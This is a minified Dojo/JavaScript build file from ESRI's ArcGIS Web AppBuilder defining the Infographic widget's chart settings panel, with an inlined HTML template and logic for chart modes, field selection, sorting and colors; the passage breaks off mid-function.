// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Infographic/setting/dijitsSetting/ChartDijitSetting.html":'\x3cdiv\x3e\r\n  \x3cdiv style\x3d"font-size: 14px;"\x3e${nls.chartSettings}\x3c/div\x3e\r\n  \x3cdiv class\x3d"section data-section padding-right-5" data-dojo-attach-point\x3d"dataSection"\x3e\r\n    \x3cdiv class\x3d"section-item chart-mode-section-item feature-mode category-mode count-mode field-mode average-align"\x3e\r\n      \x3cdiv\x3e${nls.displayMode}\x3c/div\x3e\r\n      \x3cselect data-dojo-attach-point\x3d"chartModeSelect" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-event\x3d"change:_onChartModeChanged" class\x3d"restrict-select-width"\x3e\x3c/select\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv class\x3d"section-item label-field-section-item feature-mode average-align"\x3e\r\n      \x3cdiv\x3e${nls.labelField}\x3c/div\x3e\r\n      \x3cselect data-dojo-attach-point\x3d"labelFieldSelect" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-event\x3d"change:_onLabelFieldChanged" class\x3d"restrict-select-width"\x3e\x3c/select\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv class\x3d"section-item category-field-section-item category-mode count-mode average-align"\x3e\r\n      \x3cdiv\x3e${nls.categoryField}\x3c/div\x3e\r\n      \x3cselect data-dojo-attach-point\x3d"categoryFieldSelect" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-event\x3d"change:_onCategoryFieldChanged" class\x3d"restrict-select-width"\x3e\x3c/select\x3e\r\n    \x3c/div\x3e\r\n    \r\n    \x3cdiv class\x3d"section-item category-mode count-mode"\x3e\r\n      \x3cdiv class\x3d"average-align" data-dojo-attach-point\x3d"periodDiv"\x3e\r\n        \x3cdiv\x3e${nls.minPeriod}\x3c/div\x3e\r\n        \x3cselect data-dojo-attach-point\x3d"periodSelect" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-event\x3d"change:_onMinPeriodChanged" class\x3d"restrict-select-width"\x3e\r\n          \x3coption value\x3d"automatic"\x3e${nls.automatic}\x3c/option\x3e\r\n          \x3coption value\x3d"year"\x3e${nls.year}\x3c/option\x3e\r\n          \x3coption value\x3d"month"\x3e${nls.month}\x3c/option\x3e\r\n          \x3coption value\x3d"day"\x3e${nls.day}\x3c/option\x3e\r\n          \x3coption value\x3d"hour"\x3e${nls.hour}\x3c/option\x3e\r\n          \x3coption value\x3d"minute"\x3e${nls.minute}\x3c/option\x3e\r\n          \x3coption value\x3d"second"\x3e${nls.second}\x3c/option\x3e\r\n        \x3c/select\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \r\n    \x3cdiv class\x3d"section-item category-mode count-mode"\x3e\r\n      \x3cdiv style\x3d"height: auto; margin-top: 5px;margin-bottom: 5px;display: none;" class\x3d"average-align flexStart" data-dojo-attach-point\x3d"periodsRecordsDiv"\x3e\r\n        \x3cdiv\x3e${nls.periodsWithOutRecords}\x3c/div\x3e\r\n        \x3cdiv class\x3d"tb-radio-div"\x3e\r\n          \x3cdiv class\x3d"lr-radio-label-div"\x3e\r\n            \x3cinput checked type\x3d"radio" name\x3d"periodswithoutrecords" data-dojo-attach-event\x3d"change:_onPeriodsWithOutRecords" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"showRadioBtn"\x3e\r\n            \x3clabel class\x3d"marginleft10 textOverFlow tb-radio-label" title\x3d"${nls.show}"\x3e${nls.show}\x3c/label\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv style\x3d"margin-top: 10px;" class\x3d"lr-radio-label-div"\x3e\r\n            \x3cinput type\x3d"radio" name\x3d"periodswithoutrecords" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"hideRadioBtn"\x3e\r\n            \x3clabel class\x3d"marginleft10 textOverFlow tb-radio-label" title\x3d"${nls.hide}"\x3e${nls.hide}\x3c/label\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e \r\n\r\n    \x3cdiv class\x3d"section-item operation-section-item category-mode field-mode average-align"\x3e\r\n      \x3cdiv\x3e${nls.operation}\x3c/div\x3e\r\n      \x3cselect data-dojo-attach-point\x3d"operationSelect" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-event\x3d"change:_onOperationSelectChanged" class\x3d"restrict-select-width"\x3e\r\n        \x3coption value\x3d"sum"\x3e${nls.sumOption}\x3c/option\x3e\r\n        \x3coption value\x3d"average"\x3e${nls.averageOption}\x3c/option\x3e\r\n        \x3coption value\x3d"min"\x3e${nls.minOption}\x3c/option\x3e\r\n        \x3coption value\x3d"max"\x3e${nls.maxOption}\x3c/option\x3e\r\n      \x3c/select\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv class\x3d"section-item category-mode field-mode"\x3e\r\n      \x3cdiv style\x3d"height: auto; margin-top: 5px;margin-bottom: 10px;" class\x3d"average-align flexStart" data-dojo-attach-point\x3d"nullValue"\x3e\r\n        \x3cdiv\x3e${nls.nullValue}\x3c/div\x3e\r\n        \x3cdiv class\x3d"tb-radio-div"\x3e\r\n          \x3cdiv class\x3d"lr-radio-label-div"\x3e\r\n            \x3cinput checked type\x3d"radio" name\x3d"nullValue" data-dojo-attach-event\x3d"change:_onNullValueAsZeroChange" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"zeroRadioBtn"\x3e\r\n            \x3clabel class\x3d"marginleft10 textOverFlow tb-radio-label" title\x3d"${nls.calculatedAsZero}"\x3e${nls.calculatedAsZero}\x3c/label\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv style\x3d"margin-top: 10px;" class\x3d"lr-radio-label-div"\x3e\r\n            \x3cinput type\x3d"radio" name\x3d"nullValue" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"ignoreRadioBtn"\x3e\r\n            \x3clabel class\x3d"marginleft10 textOverFlow tb-radio-label" title\x3d"${nls.ignored}"\x3e${nls.ignored}\x3c/label\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e \r\n\r\n    \x3cdiv style\x3d"height: auto;" class\x3d"section-item value-fields-section-item feature-mode category-mode field-mode average-align"\x3e\r\n      \x3cdiv\x3e${nls.valueFields}\x3c/div\x3e\r\n      \x3cdiv\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"valueFields" data-dojo-type\x3d"jimu/dijit/_DataFields" data-dojo-attach-event\x3d"change:_onValueFieldsChanged"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \r\n    \x3cdiv style\x3d"margin-top: 10px;display: none;" data-dojo-attach-point\x3d"splitFieldContainer" class\x3d"average-align"\x3e\r\n      \x3cdiv\x3e${nls.splitField}\x3c/div\x3e\r\n      \x3cselect data-dojo-attach-point\x3d"splitFieldSelect" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-event\x3d"change:_onSplitFieldsChanged" class\x3d"restrict-select-width"\x3e\x3c/select\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv style\x3d"height: auto; margin-top: 10px" class\x3d"section-item feature-mode category-mode count-mode field-mode average-align flexStart"\x3e\r\n      \x3cdiv\x3e${nls.sortBy}\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"chartSort"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \r\n    \x3cdiv style\x3d"margin-top: 5px" class\x3d"section-item feature-mode category-mode count-mode field-mode average-align"\x3e\r\n      \x3cdiv\x3e${nls.maxCategories}\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"maxLabelsDiv"\x3e   \r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"section display-section padding-right-5" data-dojo-attach-point\x3d"displaySection"\x3e\r\n    \x3cdiv class\x3d"section-item column-type bar-type pie-type line-type average-align"\x3e\r\n      \x3cdiv\x3e${nls.backgroundColor}\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"bgColor" data-dojo-type\x3d"widgets/Infographic/setting/dijitsSetting/_dijits/ChartColorSetting" data-dojo-attach-event\x3d"change:_onBgColorChanged"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \r\n    \x3cdiv style\x3d"margin-bottom: 10px;" class\x3d"section-item pie-type average-align"\x3e\r\n      \x3cdiv\x3e${nls.hollowsize}\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"hollowSize"\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv data-dojo-attach-point\x3d"chartColorContainer" style\x3d"height: auto;margin: 10px auto 0 auto;" class\x3d"section-item column-type bar-type pie-type line-type average-align flexStart"\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv data-dojo-attach-point\x3d"legendTogglePocketContent"\x3e\r\n      \x3cdiv class\x3d"average-align"\x3e\r\n        \x3cdiv\x3e${nls.textColor}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"legendTextColor" data-dojo-type\x3d"widgets/Infographic/setting/dijitsSetting/_dijits/ChartColorSetting" data-dojo-attach-event\x3d"change:_onLegendTextColorChanged"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"average-align"\x3e\r\n        \x3cdiv\x3e${nls.textSize}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"legendTextSize"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv data-dojo-attach-point\x3d"horTogglePocketContent"\x3e\r\n      \x3cdiv class\x3d"average-align"\x3e\r\n        \x3cdiv\x3e${nls.textColor}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"horTextColor" data-dojo-type\x3d"widgets/Infographic/setting/dijitsSetting/_dijits/ChartColorSetting" data-dojo-attach-event\x3d"change:_onHorColorChanged"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"average-align"\x3e\r\n        \x3cdiv\x3e${nls.textSize}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"horTextSize"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv data-dojo-attach-point\x3d"verTogglePocketContent"\x3e\r\n      \x3cdiv class\x3d"average-align"\x3e\r\n        \x3cdiv\x3e${nls.textColor}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"verTextColor" data-dojo-type\x3d"widgets/Infographic/setting/dijitsSetting/_dijits/ChartColorSetting" data-dojo-attach-event\x3d"change:_onVerColorChanged"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"average-align"\x3e\r\n        \x3cdiv\x3e${nls.textSize}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"verTextSize"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv data-dojo-attach-point\x3d"dataLabelTogglePocketContent"\x3e\r\n      \x3cdiv class\x3d"average-align"\x3e\r\n        \x3cdiv\x3e${nls.textColor}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"dataLabelTextColor" data-dojo-type\x3d"widgets/Infographic/setting/dijitsSetting/_dijits/ChartColorSetting" data-dojo-attach-event\x3d"change:_onDataLabelColorChanged"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"average-align"\x3e\r\n        \x3cdiv\x3e${nls.textSize}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"dataLabelTextSize"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/on dojo/query dojo/_base/lang dojo/_base/html dojo/_base/array dojo/Deferred dojo/_base/declare ./BaseDijitSetting dijit/_WidgetsInTemplateMixin dojo/text!./ChartDijitSetting.html jimu/DataSourceManager jimu/LayerInfos/LayerInfos jimu/dijit/TabContainer3 jimu/utils ./_dijits/ChartSort ./_dijits/TogglePocket ./_dijits/VisibleSliderBar dijit/form/NumberSpinner ./_dijits/SeriesStyle ./_dijits/ChartColorSetting jimu/dijit/_DataFields dijit/form/Select".split(" "),function(k,t,d,f,m,v,w,x,
y,z,A,B,C,u,D,r,p,E,F){return w([x,y],{templateString:z,type:"chart",baseClass:"infographic-chart-dijit-setting",colors:"#68D2E0 #087E92 #47BCF5 #FBE66A #F29157 #C8501D #2DB7C6 #C4EEF6".split(" "),oidFieldType:"esriFieldTypeOID",_stringFieldType:"esriFieldTypeString",_numberFieldTypes:["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"],_dateFieldType:"esriFieldTypeDate",ignoreChangeEvents:!1,layerInfosObj:null,dataSourceManager:null,tabContainer:null,constructor:function(a){this.appConfig=
a.appConfig;this.config=a.config;this.ORIGIN_VALUE=function(){var a={};return{get:function(b){return a[b]},set:function(b){var c=Object.keys(b)[0];a[c]=b[c]}}}();this._saveOriginValue(this.config);this.inherited(arguments);this.PRE_MODLE={config:{},computed:{}};this.modle=this._getModleTemplate();this.layerInfosObj=B.getInstanceSync();this.dataSourceManager=A.getInstance()},_saveOriginValue:function(a){"undefined"!==typeof a.type&&this.ORIGIN_VALUE.set({type:a.type});"undefined"!==typeof a.innerRadius&&
this.ORIGIN_VALUE.set({innerRadius:a.innerRadius});"undefined"!==typeof a.area&&this.ORIGIN_VALUE.set({area:a.area});"undefined"!==typeof a.stack&&this.ORIGIN_VALUE.set({stack:a.stack})},_getModleTemplate:function(){var a={dataSource:null,config:this._getInitConfigByTemplateConfig(),computed:{modes:["feature","category","count","field"],categoryFieldOptions:[],splitedField:{show:!1,splitedFieldOptions:[]},labelFieldsOptions:[],valueFields:[],sortOrder:null,definition:null,showDateOption:!1,showUseLayerSymbology:!1,
valueFieldsAsMultipleMode:!0,seriesStyleComputed:null,legendDisplay:!0}};return d.clone(a)},_getInitSortOrderConfig:function(a){var b=null;if(!a&&!a.mode)return b;var c,d=this._getSortFields(this.modle);d&&d[0]&&(c=d[0].value);"feature"===a.mode?c&&(b={field:c,isAsc:!0}):b={isLabelAxis:!0,isAsc:!0};return b},postCreate:function(){this.inherited(arguments);this._initDom()},_getDefaultColorByDiffTheme:function(){var a={bgColor:"#fff",textColor:"#000"};if(!this.appConfig)return a;"DashboardTheme"!==
this.appConfig.theme.name||"default"!==this.appConfig.theme.styles[0]&&"style3"!==this.appConfig.theme.styles[0]?"DartTheme"===this.appConfig.theme.name&&(a.bgColor="#4c4c4c",a.textColor="#fff"):(a.bgColor="#222222",a.textColor="#fff");return a},setDataSource:function(a){this.inherited(arguments);if(!this._isDSEqual(this.modle.dataSource,a)){if(this.modle.dataSource)this._clear();else{var b=this._updateConfigForTemplateConfig(this.config),b=d.mixin(this.modle.config,b||{});this.modle.config=b}this.modle.dataSource=
a;this._updateModleWithDataSource(this.modle)}},_updateModleWithDataSource:function(a){a.dataSource&&this._getLayerDefinitionByDataSource(a).then(function(b){a.computed.definition=b;this._moveValueFieldToFirst=!0;this.render(a);this._moveValueFieldToFirst=!1}.bind(this))},render:function(a){this.ignoreChangeEvents=!0;this._updateModleComputed(a);this._dynamicUpdateInitConfig(a);this._render(a);setTimeout(d.hitch(this,function(){this.ignoreChangeEvents=!1;this.onChange()}.bind(this)),200)},_dynamicUpdateInitConfig:function(a){this._updateModleSeriesStyle(a);
this._initSortOrderWhenItsNull(a)},_initSortOrderWhenItsNull:function(a){(a=a.config)&&!a.sortOrder&&(a.sortOrder=this._getInitSortOrderConfig(a))},getConfig:function(){var a=this.modle.config;return!a||!this.modle.computed.definition||!a.mode||"count"!==a.mode&&0===a.valueFields.length||!this.maxLabels.isValid()||"pie"===a.type&&""===a.maxLabels?null:d.clone(a)},destroy:function(){this.tabContainer&&(this.tabContainer.destroy(),this.tabContainer=null);this.hollowSizeControl&&(this.hollowSizeControl.destroy(),
this.hollowSizeControl=null);this.legendTextSizeControl&&(this.legendTextSizeControl.destroy(),this.legendTextSizeControl=null);this.verticalAxisTextSizeControl&&(this.verticalAxisTextSizeControl.destroy(),this.verticalAxisTextSizeControl=null);this.horizontalAxisTextSizeControl&&(this.horizontalAxisTextSizeControl.destroy(),this.horizontalAxisTextSizeControl=null);this.dataLabelSizeControl&&(this.dataLabelSizeControl.destroy(),this.dataLabelSizeControl=null);this.legendTogglePocket&&(this.legendTogglePocket.destroy(),
this.legendTogglePocket=null);this.horTogglePocket&&(this.horTogglePocket.destroy(),this.horTogglePocket=null);this.verTogglePocket&&(this.verTogglePocket.destroy(),this.verTogglePocket=null);this.dataLabelTogglePocket&&(this.dataLabelTogglePocket.destroy(),this.dataLabelTogglePocket=null);this.chartSortDijit&&(this.chartSortDijit.destroy(),this.chartSortDijit=null);this.maxLabels&&(this.maxLabels.destroy(),this.maxLabels=null);this.inherited(arguments)},onChange:function(){if(!this.ignoreChangeEvents){var a=
this.getConfig();a&&this.dijit.setConfig(a)}},_reset:function(){var a=this.modle.config;this.ignoreChangeEvents=!0;this._updateElementDisplayByChartType(a.type);this._updateElementDisplayByChartMode(this.modle);a.seriesStyle&&this.seriesStyleDijit.setConfig(a.seriesStyle);a.backgroundColor&&this.bgColor.setColorsAutomatically([a.backgroundColor]);a.legendTextColor&&this.legendTextColor.setColorsAutomatically([a.legendTextColor]);a.horizontalAxisTextColor&&this.horTextColor.setColorsAutomatically([a.horizontalAxisTextColor]);
a.verticalAxisTextColor&&this.verTextColor.setColorsAutomatically([a.verticalAxisTextColor]);a.dataLabelColor&&this.dataLabelTextColor.setColorsAutomatically([a.dataLabelColor]);a.operation||(a.operation=this.operationSelect.get("value"));"pie"===a.type&&(a.maxLabels=100);setTimeout(d.hitch(this,function(){this.ignoreChangeEvents=!1}),200)},_clear:function(){this.modle=this._getModleTemplate();this._reset();this._showChartNoData()},_getSeriesStyleInitModle:function(a){var b=this._updateModleSeriesStyle(a);
a=this._calcuteSeriesStyleComputed(a);return{config:b,computed:a}},_updateModleSeriesStyle:function(a){var b=a.config,c=b.mode,h=b.type,e=b.area,l=b.valueFields,g=a.computed,k=g.definition;a=d.clone(b.seriesStyle);var q=!1;"line"===h&&e&&(q=!0);g.showUseLayerSymbology?a.useLayerSymbology||(a.useLayerSymbology=!1):delete a.useLayerSymbology;var e=a.styles||[],n=[],f=[],g=[],n=e.map(function(a){return a.name}),f=n.filter(function(a){return 0>l.indexOf(a)}),g=l.filter(function(a){return 0>n.indexOf(a)}),
m=!1;"column"===h||"bar"===h||"line"===h?"line"===h&&"field"===c?"line~field"===n[0]?(f=[],g=[]):(f=n,g=["line~field"]):"count"===c&&("count~count"===n[0]?(f=[],g=[]):(f=n,g=["count~count"])):"pie"===h&&"field"!==c&&("pie~not-field"===n[0]?(f=[],g=[]):(m=!0,f=n,g=["pie~not-field"]));var e=e.filter(function(a){return 0>f.indexOf(a.name)}),p=e.length,c=g.map(function(a,b){return this._createSeriesStyle(a,q,p+b,m)}.bind(this)),e=e.concat(c);a.styles=null;a.styles=e;e.forEach(function(a){-1<l.indexOf(a.name)?
a.label=this._getFieldAlias(a.name,k):a.label=a.name}.bind(this));b.seriesStyle=a;return d.clone(a)},_createSeriesStyle:function(a,b,c,d){a={name:a,style:{color:this._getRandomColor(c)}};b&&(a.style.opacity=6);d&&(a.style.color="#68D2E0 #087E92 #47BCF5 #FBE66A #F29157 #C8501D".split(" "));return a},_calcuteSeriesStyleComputed:function(a){var b=a.config,c=b.mode,d=b.type,e=b.area,b=b.valueFields,l={},g=!1,f=!1,q=!1,k=!0;l.radioPanel=a.computed.showUseLayerSymbology?{singleColor:!1}:!1;"line"===d||
"column"===d||"bar"===d?(e&&(q=!0),"line"===d&&"field"===c?(g=!0,f=!1):"feature"===c||"category"===c||"field"===c?1>=b.length?g=!0:f=!0:"count"===c&&(g=!0)):"pie"===d&&("field"===c?(k=!0,1>=b.length?g=!0:f=!0):(k=!1,g=!0));l.colorSingleMode=k;l.showOpacity=q;l.radioPanel?(l.radioPanel.singleColor=g,l.radioPanel.fieldColors=f):(l.singleColor=g,l.fieldColors=f);return l},_getRandomColor:function(a){return this.colors[a%this.colors.length]},_updateUIByMode:function(){this.ignoreChangeEvents=!0;this.chartModeSelect.set("value",
this.modle.config.mode);this._updateElementDisplayByChartMode(this.modle);this._updateElementDisplayByChartType(this.modle.config.type);setTimeout(d.hitch(this,function(){this.ignoreChangeEvents=!1}),200)},_renderByModuleComputed:function(a){var b=a.computed,c=this.PRE_MODLE.computed;if(!this._isEqual(b,c)&&b){this._isEqual(b.categoryFieldOptions,c.categoryFieldOptions)||b.categoryFieldOptions&&this._updateOptions(this.categoryFieldSelect,b.categoryFieldOptions);this._isEqual(b.labelFieldsOptions,
c.labelFieldsOptions)||b.labelFieldsOptions&&this._updateOptions(this.labelFieldSelect,b.labelFieldsOptions);this._isEqual(b.valueFields,c.valueFields)||b.valueFields&&this.valueFields.setFields(b.valueFields);if(!this._isEqual(b.splitedField,c.splitedField)){var h=b.splitedField;h.show?(this._showSplitedContainer(),0<h.splitedFieldOptions.length&&this._updateOptions(this.splitFieldSelect,d.clone(h.splitedFieldOptions))):this._hideSplitedContainer()}this._isEqual(b.modes,c.modes)||(b.modes&&0<b.modes.length?
this._initChartMode(b.modes):this._initChartMode(["feature","category","count","field"]));this._isEqual(b.showDateOption,c.showDateOption)||(b.showDateOption?(this._showDataOption(this.modle.config.type),a.config.dateConfig||(h={isNeedFilled:!0,minPeriod:"automatic"},"pie"===this.modle.config.type&&(h.isNeedFilled=!1),a.config.dateConfig=h)):(this._hideDataOption(),a.config.dateConfig=null));this._isEqual(b.sortComputed,c.sortComputed)||b.sortComputed&&this.chartSortDijit.updateComputeds(b.sortComputed);
this._isEqual(b.valueFieldsAsMultipleMode,c.valueFieldsAsMultipleMode)||(b.valueFieldsAsMultipleMode?this.valueFields.setMultipleMode():this.valueFields.setSingleMode());this._isEqual(b.seriesStyleComputed,c.seriesStyleComputed)||this.seriesStyleDijit.updateComputed(b.seriesStyleComputed);this._isEqual(b.legendDisplay,c.legendDisplay)||(b.legendDisplay?this._showLegend():this._hideLegend())}},_renderByModuleConfig:function(a){var b=a.config,c=this.PRE_MODLE.config;b&&(!this._isEqual(b.mode,c.mode)&&
b.mode&&(this.chartModeSelect.set("value",b.mode),this._updateElementDisplayByChartMode(a)),!this._isEqual(b.labelField,c.labelField)&&b.labelField&&this.labelFieldSelect.set("value",b.labelField),!this._isEqual(b.categoryField,c.categoryField)&&b.categoryField&&this.categoryFieldSelect.set("value",b.categoryField),!this._isEqual(b.valueFields,c.valueFields)&&b.valueFields&&this.valueFields.selectFields(b.valueFields,!this._moveValueFieldToFirst),this._isEqual(b.splitField,c.splitField)||this.splitFieldSelect.set("value",
b.splitField),this._isEqual(b.operation,c.operation)||(b.operation?this.operationSelect.set("value",b.operation):this.operationSelect.set("value","sum")),this._isEqual(b.dateConfig,c.dateConfig)||(b.dateConfig?(a=b.dateConfig,this.periodSelect.set("value",a.minPeriod),this.showRadioBtn.setChecked(a.isNeedFilled),this.hideRadioBtn.setChecked(!a.isNeedFilled)):(this.periodSelect.set("value","automatic"),this.showRadioBtn.setChecked(!0),this.hideRadioBtn.setChecked(!1))),!this._isEqual(b.sortOrder,c.sortOrder)&&
b.sortOrder&&this.chartSortDijit.setConfig(b.sortOrder),this._isEqual(b.maxLabels,c.maxLabels)||("undefined"!==typeof b.maxLabels?this.maxLabels.set("value",b.maxLabels):this.maxLabels.set("value","")),this._isEqual(b.nullValue,c.nullValue)||("undefined"!==typeof b.nullValue?(this.zeroRadioBtn.setChecked(b.nullValue),this.ignoreRadioBtn.setChecked(!b.nullValue)):(this.zeroRadioBtn.setChecked(!0),this.ignoreRadioBtn.setChecked(!1))),this._isEqual(b.seriesStyle,c.seriesStyle)||this.seriesStyleDijit.setConfig(b.seriesStyle),
this._isEqual(b.innerRadius,c.innerRadius)||"undefined"!==typeof b.innerRadius&&this.hollowSizeControl.setValue(b.innerRadius),this._isEqual(b.backgroundColor,c.backgroundColor)||this.bgColor.setSingleColor(b.backgroundColor),this._isEqual(b.legendTextColor,c.legendTextColor)||this.legendTextColor.setSingleColor(b.legendTextColor),this._isEqual(b.horizontalAxisTextColor,c.horizontalAxisTextColor)||this.horTextColor.setSingleColor(b.horizontalAxisTextColor),this._isEqual(b.verticalAxisTextColor,c.verticalAxisTextColor)||
this.verTextColor.setSingleColor(b.verticalAxisTextColor),this._isEqual(b.dataLabelColor,c.dataLabelColor)||this.dataLabelTextColor.setSingleColor(b.dataLabelColor),this._isEqual(b.showLegend,c.showLegend)||this.legendTogglePocket.setState(!!b.showLegend),this._isEqual(b.showHorizontalAxis,c.showHorizontalAxis)||this.horTogglePocket.setState(!!b.showHorizontalAxis),this._isEqual(b.showVerticalAxis,c.showVerticalAxis)||this.verTogglePocket.setState(!!b.showVerticalAxis),this._isEqual(b.showDataLabel,
c.showDataLabel)||this.dataLabelTogglePocket.setState(!!b.showDataLabel))},_render:function(a){this._renderByModuleComputed(a);this._renderByModuleConfig(a)},_updateModleComputed:function(a){this._updateModleComputedWithDefinition(a);this._updateModleComputedOnlyByConfig(a)},_updateModleComputedWithDefinition:function(a){a.computed.definition&&(this._isDSEqual(this.modle.dataSource,this.PRE_MODLE.dataSource)||(this._updateSelectFieldOptions(a),this._updateModesByDefinition(a)),this._updateSplitedFieldOptions(a),
this._updateSortFields(a),a.computed.showUseLayerSymbology=this._shouldShowUseLayerSymbolDisplay(a),a.computed.showDateOption=this._shouldShowDateOption(a))},_getCleanFieldOption:function(a){var b=[];a.forEach(function(a){b.push({label:a.label,value:a.value})});return b},_updateSplitedFieldOptions:function(a){a=a.computed;var b=this.modle.config,c=b.categoryField,d=b.valueFields,e=this.categoryFieldSelect.getOptions(),e=this._getCleanFieldOption(e);(!e||0===e.length)&&a.categoryFieldOptions&&0<a.categoryFieldOptions.length&&
(e=this._getCleanFieldOption(a.categoryFieldOptions));e=e.filter(function(a){return a.value!==c&&a.value!==d[0]});e.unshift({label:"-",value:""});0>e.map(function(a){return a.value}).indexOf(b.splitField)&&(b.splitField="");a.splitedField.splitedFieldOptions=e},_updateSelectFieldOptions:function(a){var b=a.computed.definition;a=a.computed;var c=this.modle.config,h=d.clone(b.fields);h.forEach(function(a){a.checked=!1});var e=[this._stringFieldType,this._dateFieldType],e=e.concat(d.clone(this._numberFieldTypes)),
l=m.filter(h,d.hitch(this,function(a){return 0<=e.indexOf(a.type)}));a.categoryFieldOptions=m.map(l,d.hitch(this,function(a){return{label:a.alias||a.name,value:a.name}}));b.groupByFields&&b.groupByFields[0]&&(a.categoryFieldOptions=a.categoryFieldOptions.filter(function(a){return a.value===b.groupByFields[0]}));c.categoryField||(c.categoryField=a.categoryFieldOptions[0].value);var g=[this._stringFieldType,this.oidFieldType,this._dateFieldType].concat(d.clone(this._numberFieldTypes)),l=m.filter(h,
d.hitch(this,function(a){return 0<=g.indexOf(a.type)}));a.labelFieldsOptions=m.map(l,d.hitch(this,function(a){return{label:a.alias||a.name,value:a.name}}));c.labelField||(c.labelField=a.labelFieldsOptions[0].value);a.valueFields=m.filter(h,d.hitch(this,function(a){return 0<=this._numberFieldTypes.indexOf(a.type)}));if(b.groupByFields&&b.groupByFields[0]){var f=a.categoryFieldOptions.map(function(a){return a.value});a.valueFields=a.valueFields.filter(function(a){return 0>f.indexOf(a.name)})}},_updateModleComputedOnlyByConfig:function(a){var b=
a.config,c=b.mode,d=b.type,e=this._calcuteSeriesStyleComputed(a);a.computed.seriesStyleComputed=e;e=!0;("feature"===c||"category"===c)&&b&&"pie"===b.type&&(e=!1);!e&&1<b.valueFields.length&&(b.valueFields=b.valueFields.slice(0,1));a.computed.valueFieldsAsMultipleMode=e;"pie"===d?d=!0:(d=!0,"count"===c||"field"===c?d=!1:b.seriesStyle&&(d=!b.seriesStyle.useLayerSymbology));a.computed.splitedField.show=!1;a.computed.legendDisplay=d},_getInitConfigByTemplateConfig:function(){var a={},b=this.ORIGIN_VALUE.get("type");
b&&(a.type=b);b=this.ORIGIN_VALUE.get("innerRadius");"undefined"!==typeof b&&(a.innerRadius=b);b=this.ORIGIN_VALUE.get("area");"undefined"!==typeof b&&(a.area=b);b=this.ORIGIN_VALUE.get("stack");"undefined"!==typeof b&&(a.stack=b);"undefined"===typeof a.mode&&(a.mode="feature");"undefined"===typeof a.labelField&&(a.labelField="");"undefined"===typeof a.categoryField&&(a.categoryField="");"undefined"===typeof a.valueFields&&(a.valueFields=[]);"undefined"===typeof a.splitField&&(a.splitField="");"undefined"===
typeof a.dateConfig&&(a.dateConfig=null);"undefined"===typeof a.operation&&(a.operation="");"undefined"===typeof a.nullValue&&(a.nullValue=!0);"undefined"===typeof a.useLayerSymbology&&(a.useLayerSymbology=!1);a.sortOrder||(a.sortOrder=this._getInitSortOrderConfig(a));return this._updateConfigForTemplateConfig(a)},_updateConfigForTemplateConfig:function(a){var b=this._getDefaultColorByDiffTheme(),c=b.textColor,b=b.bgColor;a.backgroundColor||(a.backgroundColor=b);"undefined"===typeof a.showLegend&&
